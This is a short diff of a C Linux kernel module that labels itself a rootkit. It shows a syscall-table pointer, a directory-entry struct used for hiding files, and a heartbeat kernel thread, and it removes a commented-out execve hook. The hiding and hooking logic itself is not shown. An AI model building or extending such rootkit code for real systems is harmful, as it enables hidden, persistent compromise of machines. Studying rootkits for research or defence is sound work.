@@ -11,15 +11,6 @@ struct task_struct *kt;
 unsigned long *syscall_table;
 pte_t *pte;
 
-/* 
-asmlinkage int (*real_execve)(const char *filename, char *const argv[], char *const envp[]);
-
-asmlinkage int new_execve(const char *filename, char *const argv[], char *const envp[]) {
-	pr_info("ROOTKIT hooked call to execve(%s, ...)\n", filename);
-	return real_execve(filename, argv, envp);
-}
-*/
-
 struct linux_dirent {
 	unsigned long  d_ino;     /* Inode number */
 	unsigned long  d_off;     /* Offset to next linux_dirent */
@@ -86,7 +77,7 @@ static int threadfn(void *data){
 	do {
 		pr_info("Kernel thread heartbeat (5s)");
 		msleep(5000);
-	} while(!kthread_should_stop());
+	} while (!kthread_should_stop());
 	
 	pr_info("ROOTKIT kernel thread stopping\n");
 	return 0;
